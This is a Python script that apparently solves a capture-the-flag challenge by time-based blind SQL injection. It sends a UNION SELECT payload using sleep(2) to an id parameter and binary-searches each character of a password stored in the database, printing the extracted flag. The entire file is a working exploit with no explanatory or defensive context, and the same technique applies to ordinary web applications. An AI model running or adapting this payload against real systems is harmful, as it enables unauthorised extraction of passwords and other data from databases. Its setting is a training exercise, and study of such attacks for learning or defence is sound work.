import requests

payload = "0' union select 'a',if(ascii(substr((select password from ctfshow_user5 where username='flag'), {},1))>{},sleep(2),1) %23"
url = "http://dc63c6a5-aa8b-4e21-a765-56eb704e4809.challenge.ctf.show:8080/api/v5.php?id="


def test_chr(index: int, offset: int):
    try:
        response = requests.get(url + payload.format(index, offset), timeout=1)
    except:
        return True
    return False


index = 1
flag = ""
while True:
    start = 32
    end = 127
    while True:
        if abs(start-end) == 1 or start == end:
            break
        point = (start + end) // 2
        if test_chr(index, point):
            start = point
        else:
            end = point
    if end < start:
        end = start
    flag += chr(end)
    print(f"[*] flag: {flag}")
    index += 1
